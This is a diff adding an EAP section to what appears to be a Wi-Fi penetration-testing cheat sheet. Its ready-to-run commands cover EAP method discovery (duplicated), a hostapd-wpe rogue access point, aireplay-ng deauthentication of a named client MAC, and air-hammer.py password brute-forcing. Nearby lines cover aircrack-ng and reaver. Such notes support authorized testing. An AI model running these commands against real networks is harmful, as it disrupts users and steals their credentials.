@@ -57,6 +57,7 @@ find other clients in the same network
 arp-scan -l -I wlan0
 ```
 
+
 ## WEP based deauth attack
 
 
@@ -83,6 +84,27 @@ aircrack-ng -w /usr/share/john/password.lst -e [essid] -b [bssid] wpa-01.cap
 ## WPS
 
 reaver -i wlan0 -b [bssid]
+
+## EAP
+
+Discover EAP supported by network
+```bash
+EAP_buster.sh [essid] [domain\username] [interface]
+```
+
+Discover EAP supported by network
+```bash
+EAP_buster.sh [essid] [domain\username] [interface]
+```
+
+alternative
+hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
+After starting the RogueAP we disconnect the client
+aireplay-ng -0 0 -a F0:9F:C2:71:22:55 wlan0mon -c 10:f9:6f:07:6c:00
+
+bruteforce users from the given file (domain\username list)
+air-hammer.py -i wlan0 -e [essid] -p ~/rockyou.txt -u [users_file]
+
 
 ## Post-exploitation
 
